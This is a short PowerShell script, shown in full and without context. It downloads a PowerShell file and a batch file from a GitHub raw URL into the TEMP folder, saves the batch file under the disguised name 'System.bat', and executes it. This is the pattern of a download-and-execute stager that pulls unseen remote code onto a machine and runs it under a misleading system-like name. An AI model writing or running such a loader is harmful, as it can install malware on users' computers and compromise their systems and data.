$url1 = "https://raw.githubusercontent.com/cia168168/folder/main/RunV/MyScript.ps1"
$output1 = "$env:TEMP\MyScript.ps1"
Invoke-WebRequest -Uri $url1 -OutFile $output1
$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/new.bat"
$output4 = "$env:TEMP\System.bat"
Invoke-WebRequest -Uri $url4 -OutFile $output4
& $output4
